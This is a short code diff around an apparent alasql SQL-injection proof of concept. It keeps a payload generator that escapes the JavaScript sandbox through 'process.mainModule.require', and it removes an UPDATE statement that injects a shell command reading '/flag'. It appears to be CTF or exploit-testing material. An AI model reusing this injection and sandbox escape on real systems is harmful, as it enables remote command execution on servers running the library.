@@ -1,3 +1,6 @@
+alasql("CREATE table example1(a INT)");
+alasql("INSERT INTO example1 VALUES (1337)");
+
 const genPayload = command => `
 new Function(
     'return this.process.mainModule.require'
@@ -5,6 +8,3 @@ new Function(
 `;
 
 
-alasql("CREATE table test");
-alasql("INSERT INTO test VALUES (1337)");
-alasql("UPDATE test SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42");
